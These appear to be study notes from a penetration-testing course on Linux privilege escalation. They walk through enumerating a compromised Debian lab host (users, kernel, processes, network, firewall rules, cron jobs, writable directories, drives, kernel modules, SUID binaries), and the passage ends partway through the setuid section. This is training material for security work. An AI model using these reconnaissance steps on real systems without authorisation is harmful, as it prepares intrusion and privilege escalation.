# Linux Privilege Escalation
As with many other attack techniques, escalating privileges requires us to collect knowledge about the target
+ This is accomplished by enumerating the operating system for any kind of misconfiguration or software vulnerability that can be leveraged for our purposes

As documented within the MITRE ATT&CK Framework, privilege escalation is a tactic comprising different techniques that aim to leverage user permissions to access restricted resources

In this Module, we will turn our attention to Linux-based targets
+ We will explore how to enumerate Linux machines and what constitutes Linux privileges
+ We'll then demonstrate common Linux-based privilege escalation techniques based on insecure file permissions and misconfigured system components

## Enumerating Linux

### Understanding Files and Users Privileges on Linux
One of the defining features of Linux and other UNIX derivatives is that most resources, including files, directories, devices, and even network communications are represented in the filesystem
+ Put colloquially, "everything is a file"

Every file (and by extension every element of a Linux system) abides by user and group permissions based on three primary properties: read (symbolized by r), write (symbolized by w), and execute (symbolized by x)
+ Each file or directory has specific permissions for three categories of users: the owner, the owner group and others group
+ Each permission (rwx) allows the designated collection of users to perform different actions depending on if the resource is a file or a directory

For files, r allows reading the file content, w allows changing its content and x allows the file to be run
+ A directory is handled differently from a file.
	+ Read access gives the right to consult the list of its contents (files and directories).
	+ Write access allows creating or deleting files
	+ Finally, execute access allows crossing through the directory to access its contents (using the cd command, for example)
		+ Being able to cross through a directory without being able to read it gives the user permission to access known entries, but only by knowing their exact name

Let's examine a simple combination of those file permissions using a real-world example on our local Kali machine, since it's based on the Linux Debian distribution
```
kali@kali:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1751 May  2 09:31 /etc/shadow
```

For each user category, the three different access permissions are displayed
+ The very first hyphen we encounter describes the file type
	+ Since it's not strictly related to file permissions, we can safely ignore it 
+ The next three characters display the file owner (root) permissions, which are rw-, meaning the owner has read and write, but no execute privileges
+ Next, the shadow group owner has only been given read access, as the write and execute flag are unset
+ Finally, the others group has not been granted any access rights for this file

We can now apply this introductory knowledge about Linux file permissions while performing privilege escalation enumeration in the next section

### Manual Enumeration
Manually enumerating Linux systems can be time consuming
+ However, this approach allows for a more controlled outcome because it helps identify more peculiar privilege escalation methods that are often overlooked by automated tools

Furthermore, automated enumeration cannot replace manual investigation because the customized settings of our target environments are likely to be exactly those that are misconfigured
+ Some of the commands in this Module may require minor modifications depending on the target operating system version
+ In addition, not all the commands presented in this section will be reproducible on the dedicated clients

#### User Context
When gaining initial access to a target, one of the first things we should identify is the user context
+ We can use the `id` command to gather user context information
+ We can do so by connecting through SSH as the `joe` user to our Debian lab machine
+ Usage: 
```
id
```
+ Example output:
```
uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```
+ The output reveals that we are operating as the _joe_ user, which has a User Identifier (UID) and Group Identifier (GID) of 1000
+ The user joe is also part of other groups that are out of scope for this Module

#### Users
To enumerate all users, we can simply read the contents of the **/etc/passwd** file
```
cat /etc/passwd
```
+ Example output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash
```

The **passwd** file lists several user accounts, including accounts used by various services on the target machine such as _www-data_ and _sshd_
+ This indicates that a web server and an SSH server are likely installed on the system

We can now zoom in on our current user's data:
- **Login Name**: "joe" - Indicates the username used for login.
- **Encrypted Password**: "x" - This field typically contains the hashed version of the user's password. In this case, the value _x_ means that the entire password hash is contained in the **/etc/shadow** file (more on that shortly).
- **UID**: "1000" - Aside from the root user that has always a UID of _0_, Linux starts counting regular user IDs from 1000. This value is also called _real user ID_.
- **GID**: "1000" - Represents the user's specific Group ID.
- **Comment**: "joe,,," - This field generally contains a description about the user, often simply repeating username information.
- **Home Folder**: "/home/joe" - Describes the user's home directory prompted upon login.
- **Login Shell**: "/bin/bash" - Indicates the default interactive shell, if one exists.

In addition to the _joe_ user, we also notice another user named _eve_, and we can infer this is a standard user since it has a configured home folder **/home/eve**
+ On the other hand, system services are configured with the **/usr/sbin/nologin** as login shell, where the _nologin_ statement is used to block any remote or local login for service accounts

Enumerating all users on a target machine can help identify potential high-privilege user accounts we could target in an attempt to elevate our privileges

#### Hostname
Next, a machine's _hostname_ can often provide clues about its functional roles
+ More often than not, the hostnames will include identifiable abbreviations such as _web_ for a web server, _db_ for a database server, _dc_ for a domain controller, etc
+ On most Linux distributions, we can find the hostname embedded in the command prompt
+ However, we should rely only on system commands to retrieve the target's information, since sometimes the prompt's text can be deceiving

Can discover the hostname with the aptly-named `hostname` command
```
hostname
```
+ Example output:
```
debian-privesc
```

Enterprises often enforce a naming convention scheme for hostnames, so they can be categorized by location, description, operating system, and service level
+ In our case, the hostname is comprised of only two parts: the OS type and the description
+ Identifying the role of a machine can help us focus our information gathering efforts by increasing the context surrounding the host

#### Kernel
At some point during the privilege escalation process, we may need to rely on _kernel_ exploits that specifically exploit vulnerabilities in the core of a target's operating system
+ These types of exploits are built for a very specific type of target, specified by a particular operating system and version combination
+ Since attacking a target with a mismatched kernel exploit can lead to system instability or even a crash, we must gather precise information about the target
	+ **NOTE**: Any system instability caused by our penetration testing activity would likely alert system administrators prior to any SOC team. For this reason, we should be twice as careful when dealing with kernel exploits and, when possible, test the exploits in a local environment beforehand

The **`/etc/issue`** and **`/etc/os-release`** files contain information about the operating system release and version. We can also run the **`uname -a`**
+ Usage:
```
cat /etc/issue
```
+ Example output:
```
Debian GNU/Linux 10 \n \l
```
+ Usage:
```
cat /etc/os-release
```
+ Example output:
```
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
+ Usage:
```
uname -a
```
+ Example output:
```
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30)
x86_64 GNU/Linux
```

The **issue** and **os-release** files located in the **/etc** directory contain the operating system version (Debian 10) and release-specific information, including the distribution codename (buster)

The command **uname -a** outputs the kernel version (4.19.0) and architecture (x86_64)

#### Running Processes and Services
Next, let's explore which running processes and services may allow us to elevate our privileges
+ For this to occur, the process must run in the context of a privileged account and must either have insecure permissions or allow us to interact with it in unintended ways

We can list system processes (including those run by privileged users) with the `ps` command
+ 'll use the **a** and **x** flags to list all processes with or without a _tty_ and the **u** flag to list the processes in a user-readable format
+ Usage:
```
ps aux
```
+ Example output:
```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 169592 10176 ?        Ss   Aug16   0:02 /sbin/init
...
colord     752  0.0  0.6 246984 12424 ?        Ssl  Aug16   0:00 /usr/lib/colord/colord
Debian-+   753  0.0  0.2 157188  5248 ?        Sl   Aug16   0:00 /usr/lib/dconf/dconf-service
root       477  0.0  0.5 179064 11060 ?        Ssl  Aug16   0:00 /usr/sbin/cups-browsed
root       479  0.0  0.4 236048  9152 ?        Ssl  Aug16   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       486  0.0  1.0 123768 22104 ?        Ssl  Aug16   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       510  0.0  0.3  13812  7288 ?        Ss   Aug16   0:00 /usr/sbin/sshd -D
root       512  0.0  0.3 241852  8080 ?        Ssl  Aug16   0:00 /usr/sbin/gdm3
root       519  0.0  0.4 166764  8308 ?        Sl   Aug16   0:00 gdm-session-worker [pam/gdm-launch-environment]
root       530  0.0  0.2  11164  4448 ?        Ss   Aug16   0:03 /usr/sbin/apache2 -k start
root      1545  0.0  0.0      0     0 ?        I    Aug16   0:00 [kworker/1:1-events]
root      1653  0.0  0.3  14648  7712 ?        Ss   01:03   0:00 sshd: joe [priv]
root      1656  0.0  0.0      0     0 ?        I    01:03   0:00 [kworker/1:2-events_power_efficient]
joe       1657  0.0  0.4  21160  8960 ?        Ss   01:03   0:00 /lib/systemd/systemd --user
joe       1658  0.0  0.1 170892  2532 ?        S    01:03   0:00 (sd-pam)
joe       1672  0.0  0.2  14932  5064 ?        S    01:03   0:00 sshd: joe@pts/0
joe       1673  0.0  0.2   8224  5020 pts/0    Ss   01:03   0:00 -bash
root      1727  0.0  0.0      0     0 ?        I    03:00   0:00 [kworker/0:0-ata_sff]
root      1728  0.0  0.0      0     0 ?        I    03:06   0:00 [kworker/0:2-ata_sff]
joe       1730  0.0  0.1  10600  3028 pts/0    R+   03:10   0:00 ps axu
```

The output lists several processes running as root that are worth researching for possible vulnerabilities
+ We'll notice the **ps** command we ran is also listed in the output, owned by the current user
+ We can also filter the specific user-owned process from the output with the appropriate username

#### Network 
The next step in our analysis of the target host is to review available network interfaces, routes, and open ports
+ This information can help us determine if the compromised target is connected to multiple networks and therefore could be used as a **pivot**
	+ An attacker may use a compromised target to pivot, or move between connected networks. This will amplify network visibility and allow the attacker to target hosts not directly reachable from the original attack machine
+ The presence of specific virtual interfaces may also indicate the existence of virtualization or antivirus software

We can also investigate port bindings to see if a running service is only available on a loopback address, rather than on a routable one
+ Investigating a privileged program or service listening on the loopback interface could expand our attack surface and increase our probability of a privilege escalation attack's success

##### Network Adapters
Depending on the version of Linux, we can list the TCP/IP configuration of every network adapter with either **`ifconfig`** or **`ip`**
+ While the former command displays interface statistics, the latter provides a compact version of the same information
+ Both commands accept the **a** flag to display all information available
+ Usage:
```
ip a
```
+ Example output:
```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:b9:fc brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.214/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:b9fc/64 scope link
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:72:64 brd ff:ff:ff:ff:ff:ff
    inet 172.16.60.214/24 brd 172.16.60.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:7264/64 scope link
       valid_lft forever preferred_lft forever
```

##### Routes
Based on the output above, the Linux client is also connected to more than one network
+ We can display network routing tables with either **route** or **routel**, depending on the Linux distribution and version. Both commands provide similar information
+ Usage:
```
routel
```
+ Example output:
```
         target            gateway          source    proto    scope    dev tbl
/usr/bin/routel: 48: shift: can't shift that many
        default     192.168.50.254                   static          ens192
    172.16.60.0 24                   172.16.60.214   kernel     link ens224
   192.168.50.0 24                  192.168.50.214   kernel     link ens192
      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
      127.0.0.0 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
    172.16.60.0          broadcast   172.16.60.214   kernel     link ens224 local
  172.16.60.214              local   172.16.60.214   kernel     host ens224 local
  172.16.60.255          broadcast   172.16.60.214   kernel     link ens224 local
   192.168.50.0          broadcast  192.168.50.214   kernel     link ens192 local
 192.168.50.214              local  192.168.50.214   kernel     host ens192 local
 192.168.50.255          broadcast  192.168.50.214   kernel     link ens192 local
            ::1                                      kernel              lo
         fe80:: 64                                   kernel          ens224
         fe80:: 64                                   kernel          ens192
            ::1              local                   kernel              lo local
fe80::250:56ff:fe8a:7264              local                   kernel          ens224 local
fe80::250:56ff:fe8a:b9fc              local                   kernel          ens192 local
```

##### Active Network Connections
Finally, we can display active network connections and listening ports using either **`netstat`** or **`ss`**, both of which accept the same arguments
+ For example, we can list all connections with **-a**, avoid hostname resolution (which may stall the command execution) with **-n**, and list the process name the connection belongs to with **-p**
+ We can combine the arguments and simply run **ss -anp**:
```
ss -anp
```
+ Example output:
```
Netid      State       Recv-Q      Send-Q                                        Local Address:Port                     Peer Address:Port
nl         UNCONN      0           0                                                         0:461                                  *
nl         UNCONN      0           0                                                         0:323                                  *
nl         UNCONN      0           0                                                         0:457                                  *
...
udp        UNCONN      0           0                                                      [::]:47620                            [::]:*
tcp        LISTEN      0           128                                                 0.0.0.0:22                            0.0.0.0:*
tcp        LISTEN      0           5                                                 127.0.0.1:631                           0.0.0.0:*
tcp        ESTAB       0           36                                           192.168.50.214:22                      192.168.118.2:32890
tcp        LISTEN      0           128                                                       *:80                                  *:*
tcp        LISTEN      0           128                                                    [::]:22                               [::]:*
tcp        LISTEN      0           5                                                     [::1]:631  
```

The output lists the various listening ports and active sessions, including our own active SSH connection and its listening socket

#### Firewall
Continuing with our baseline enumeration, let's focus next on firewall rules
+ In general, we're primarily interested in a firewall's state, profile, and rules during the remote exploitation phase of an assessment
+ However, this information can also be useful during privilege escalation
+ For example, if a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface
+ If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system

During this phase, we can also gather information about inbound and outbound port filtering to facilitate port forwarding and tunneling when it's time to pivot to an internal network

On Linux-based systems, we must have _root_ privileges to list firewall rules with _iptables_
+ However, depending on how the firewall is configured, we may be able to glean information about the rules as a standard user

For example, the _iptables-persistent_ package on Debian Linux saves firewall rules in specific files under **`/etc/iptables`** by default
+ These files are used by the system to restore _netfilter_ rules at boot time
+ These files are often left with weak permissions, allowing them to be read by any local user on the target system

We can also search for files created by the _iptables-save_ command, which is used to dump the firewall configuration to a file specified by the user
+ This file is then usually used as input for the _iptables-restore_ command and used to restore the firewall rules at boot time
+ If a system administrator had ever run this command, we could search the configuration directory (**/etc**) or grep the file system for iptables commands to locate the file
+ If the file has insecure permissions, we could use the contents to infer the firewall configuration rules running on the system:=
```
joe@debian-privesc:~$ cat /etc/iptables/rules.v4
# Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
COMMIT
# Completed on Thu Aug 18 12:53:22 2022
```

Since this file is read-only by any users other than root, we can inspect its contents. We'll notice a non-default rule that explicitly allows the destination port _1999_
+ This configuration detail stands out and should be noted for later investigation

#### Scheduled Tasks
Next, let's examine scheduled tasks that attackers commonly leverage during privilege escalation attacks
+ Systems acting as servers often periodically execute various automated, scheduled tasks
+ When these systems are misconfigured, or the user-created files are left with insecure permissions, we can modify these files that will be executed by the scheduling system at a high privilege level

The Linux-based job scheduler is known as _cron_
+ Scheduled tasks are listed under the **`/etc/cron*`** directories, where _`*`_ represents the frequency at which the task will run
+ For example, tasks that will be run daily can be found under **/etc/cron.daily**
+ Each script is listed in its own subdirectory
+ Usage:
```
ls -lah /etc/cron*
```
+ Example output:
```
-rw-r--r-- 1 root root 1.1K Oct 11  2019 /etc/crontab

/etc/cron.d:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16 04:25 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--   1 root root  285 May 19  2019 anacron

/etc/cron.daily:
total 60K
drwxr-xr-x   2 root root 4.0K Aug 18 09:05 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  311 May 19  2019 0anacron
-rwxr-xr-x   1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x   1 root root 1.5K Dec  7  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root  384 Dec 31  2018 cracklib-runtime
-rwxr-xr-x   1 root root 1.2K Apr 18  2019 dpkg
-rwxr-xr-x   1 root root 2.2K Feb 10  2018 locate
-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x   1 root root 1.1K Feb 10  2019 man-db
-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 20K
drwxr-xr-x   2 root root 4.0K Aug 16 04:17 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16 04:25 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  313 May 19  2019 0anacron

/etc/cron.weekly:
total 28K
drwxr-xr-x   2 root root 4.0K Aug 16 04:26 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  312 May 19  2019 0anacron
-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
joe@debian-privesc:~$
```

Listing the directory contents, we notice several tasks scheduled to run daily

It is worth noting that system administrators often add their own scheduled tasks in the **/etc/crontab** file which can have custom time frames as apposed to the pre-made `cron.*` directories 
+ These tasks should be inspected carefully for insecure file permissions, since most jobs in this particular file will run as root
+ To view the current user's scheduled jobs, we can run **crontab** followed by the **-l** parameter
+ Usage:
```
crontab -l
```
+ Example output:
```
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
```
+ The above output, only the commented instructions are present, meaning no cron job has been configured for the user _joe_

If we try to run the same command with the **sudo** prefix, we discover that a backup script is scheduled to run every minute
+ Usage:
```
sudo crontab -l
```
+ Output:
```
[sudo] password for joe:
# Edit this file to introduce tasks to be run by cron.
...
# m h  dom mon dow   command

* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
```

Listing cron jobs using sudo reveals jobs run by the _root_ user
+ In this example, it shows a backup script running as root
+ If this file has weak permissions, we may be able to leverage it to escalate our privileges

#### Applications
At some point, we may need to leverage an exploit to escalate our local privileges
+ If so, our search for a working exploit begins with the enumeration of all installed applications, noting the version of each
+ We can use this information to search for a matching exploit

Manually searching for this information could be very time consuming and ineffective, so we'll learn how to automate this process in the next section
+ However, we should know how to manually query installed packages as this is needed to corroborate information obtained during previous enumeration steps

Linux-based systems use a variety of package managers. For example, Debian-based Linux distributions, like the one in our lab, use _dpkg_
+ while Red Hat-based systems use _rpm_

To list applications installed by dpkg on our Debian system, we can use **dpkg -l**
+ Usage:
```
dpkg -l
```
+ Example output:
```
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                  Version                                      Architecture Description
+++-=====================================-============================================-============-===============================================================================
ii  accountsservice                       0.6.45-2                                     amd64        query and manipulate user account information
ii  acl                                   2.2.53-4                                     amd64        access control list - utilities
ii  adduser                               3.118                                        all          add and remove users and groups
ii  adwaita-icon-theme                    3.30.1-1                                     all          default icon theme of GNOME
ii  aisleriot                             1:3.22.7-2                                   amd64        GNOME solitaire card game collection
ii  alsa-utils                            1.1.8-2                                      amd64        Utilities for configuring and using ALSA
ii  anacron                               2.3-28                                       amd64        cron-like program that doesn't go by time
ii  analog                                2:6.0-22                                     amd64        web server log analyzer
ii  apache2                               2.4.38-3+deb10u7                             amd64        Apache HTTP Server
ii  apache2-bin                           2.4.38-3+deb10u7                             amd64        Apache HTTP Server (modules and other binary files)
ii  apache2-data                          2.4.38-3+deb10u7                             all          Apache HTTP Server (common files)
ii  apache2-doc                           2.4.38-3+deb10u7                             all          Apache HTTP Server (on-site documentation)
ii  apache2-utils                         2.4.38-3+deb10u7                             amd64        Apache HTTP Server (utility programs for web servers)
...
```
+ This confirms what we expected earlier from enumerating listening ports: the Debian 10 machine is, in fact, running a web server. In this case, it is running Apache2

As we previously mentioned, files with insufficient access restrictions can create a vulnerability that may grant an attacker elevated privileges
+ This most often happens when an attacker can modify scripts or binary files that are executed under the context of a privileged account

Sensitive files that are readable by an unprivileged user may also contain important information such as hard-coded credentials for a database or a service account running with higher privileges
+ Since it is not feasible to manually check the permissions of each file and directory, we need to automate this task as much as possible
+ As a start, we can use **find** to identify files with insecure permissions

In the example below, we are searching for every directory writable by the current user on the target system
+ We'll search the whole root directory (**/**) and use the **-writable** argument to specify the attribute we are interested in
+ We can also use **-type d** to locate directories, and filter errors with **`2>/dev/null`**
+ Usage:
```
find / -writable -type d 2>/dev/null
```
+ Example output:
```
..
/home/joe
/home/joe/Videos
/home/joe/Templates
/home/joe/.local
/home/joe/.local/share
/home/joe/.local/share/sounds
/home/joe/.local/share/evolution
/home/joe/.local/share/evolution/tasks
/home/joe/.local/share/evolution/tasks/system
/home/joe/.local/share/evolution/tasks/trash
/home/joe/.local/share/evolution/addressbook
/home/joe/.local/share/evolution/addressbook/system
/home/joe/.local/share/evolution/addressbook/system/photos
/home/joe/.local/share/evolution/addressbook/trash
/home/joe/.local/share/evolution/mail
/home/joe/.local/share/evolution/mail/trash
/home/joe/.local/share/evolution/memos
/home/joe/.local/share/evolution/memos/system
/home/joe/.local/share/evolution/memos/trash
/home/joe/.local/share/evolution/calendar
/home/joe/.local/share/evolution/calendar/system
/home/joe/.local/share/evolution/calendar/trash
/home/joe/.local/share/icc
/home/joe/.local/share/gnome-shell
/home/joe/.local/share/gnome-settings-daemon
/home/joe/.local/share/keyrings
/home/joe/.local/share/tracker
/home/joe/.local/share/tracker/data
/home/joe/.local/share/folks
/home/joe/.local/share/gvfs-metadata
/home/joe/.local/share/applications
/home/joe/.local/share/nano
/home/joe/Downloads
/home/joe/.scripts
/home/joe/Pictures
/home/joe/.cache

...
```

As shown above, several directories seem to be world-writable, including the **/home/joe/.scripts** directory, which is the location of the cron script we found earlier
+ This certainly warrants further investigation

#### Drives
On most systems, drives are automatically mounted at boot time
+ Because of this, it's easy to forget about unmounted drives that could contain valuable information
+ We should always look for unmounted drives, and if they exist, check the mount permissions

On Linux-based systems, we can use **mount** to list all mounted filesystems
+ Usage:
```
mount
```
+ Example output:
```
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001064k,nr_inodes=250266,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204196k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
...
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=25,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=10550)
mqueue on /dev/mqueue type mqueue (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
tmpfs on /run/user/117 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=117,gid=124)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1000,gid=1000)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
```

In addition, the **/etc/fstab** file lists all drives that will be mounted at boot time
+ Usage:
```
cat /etc/fstab
```
+ Example output:
```
UUID=60b4af9b-bc53-4213-909b-a2c5e090e261 /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=86dc11f3-4b41-4e06-b923-86e78eaddab7 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
```

The output reveals a swap partition and the primary `ext4` disk of this Linux system
+ The operating system moves less frequently used or inactive data from RAM to the swap space
+ Keep in mind that the system administrator might have used custom configurations or scripts to mount drives that are not listed in the **/etc/fstab** file. Because of this, it's good practice to not only scan **/etc/fstab**, but to also gather information about mounted drives using **mount**

Can us `lsblk` to view all available **disks**
+ Usage:
```
lsblk
```
+ Example output:
```
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   32G  0 disk
|-sda1   8:1    0   31G  0 part /
|-sda2   8:2    0    1K  0 part
`-sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1 1024M  0 rom
```

We'll notice that the sda drive consists of three different numbered partitions
+ In some situations, showing information for all local disks on the system might reveal partitions that are not mounted
+ Depending on the system configuration (or misconfiguration), we then might be able to mount those partitions and search for interesting documents, credentials, or other information that could allow us to escalate our privileges or get a better foothold in the network

#### Drivers and Kernel Modules
Another common privilege escalation technique involves exploitation of device drivers and kernel modules

We will explore actual exploitation tactics later in this Module, but first let's examine some important enumeration techniques
+ Since this technique relies on matching vulnerabilities with corresponding exploits, we'll need to gather a list of drivers and kernel modules that are loaded on the target

We can enumerate the loaded kernel modules using **`lsmod`** without any additional arguments
+ Usage:
```
lsmod
```
+ Example output:
```
Module                  Size  Used by
binfmt_misc            20480  1
rfkill                 28672  1
sb_edac                24576  0
crct10dif_pclmul       16384  0
crc32_pclmul           16384  0
ghash_clmulni_intel    16384  0
vmw_balloon            20480  0
...
drm                   495616  5 vmwgfx,drm_kms_helper,ttm
libata                270336  2 ata_piix,ata_generic
vmw_pvscsi             28672  2
scsi_mod              249856  5 vmw_pvscsi,sd_mod,libata,sg,sr_mod
i2c_piix4              24576  0
button                 20480  0
```

Once we've collected the list of loaded modules and identified those we want more information about, such as **libata** in the above example, we can use **`modinfo`** to find out more about the specific module
+ We should note that this tool requires the full path to run
+ Usage:
```
/sbin/modinfo <MODULE> 
```
+ Example:
```
joe@debian-privesc:~$ /sbin/modinfo libata
filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
version:        3.00
license:        GPL
description:    Library module for ATA devices
author:         Jeff Garzik
srcversion:     00E4F01BB3AA2AAF98137BF
depends:        scsi_mod
retpoline:      Y
intree:         Y
name:           libata
vermagic:       4.19.0-21-amd64 SMP mod_unload modversions
sig_id:         PKCS#7
signer:         Debian Secure Boot CA
sig_key:        4B:6E:F5:AB:CA:66:98:25:17:8E:05:2C:84:66:7C:CB:C0:53:1F:8C
...
```

Once we've obtained a list of drivers and their versions, we are better positioned to find any relevant exploits

#### setuid and setgid
Later in this Module, we will explore various methods of privilege escalation. However, there are a few specific enumerations we should cover in this section that could reveal interesting "shortcuts" to privilege escalation

Aside from the _rwx_ file permissions described previously, two additional special rights pertain to executable files: _setuid_ and _setgid_
+ These are symbolized with the letter "s"

If these two rights are set, either an uppercase or lowercase "s" will appear in the permissions
+ This allows the current user to execute the file with the rights of the _owner_ (setuid) or the _owner's group_ (setgid)

When running an executable, it normally inherits the permissions of the user that runs it 
+ However, if the SUID permissions are set, the binary will run with the permissions of the file owner
+ This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges

When a user or a system-automated script launches a SUID application, it inherits the UID/GID of its initiating script: this is known as effective UID/GID (eUID, eGID), which is the actual user that the OS verifies to grant permissions for a given action

Any user who manages to subvert a setuid root program to call a command of their choice can effectively impersonate the root user and gains all rights on the system
+ Penetration testers regularly search for these types of files when they gain access to a system as a way of escalating their privileges

We can use **find** to search for SUID-marked binaries
+ In this case, we are starting our search at the root directory (**`/`**), searching for files (**`-type f`**) with the SUID bit set, (**`-perm -u=s`**) and discarding all error messages (**`2>/dev/null`**)
+ Usage:
```
find / -perm -u=s -type f 2>/dev/null
```
+ Example output:
```
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
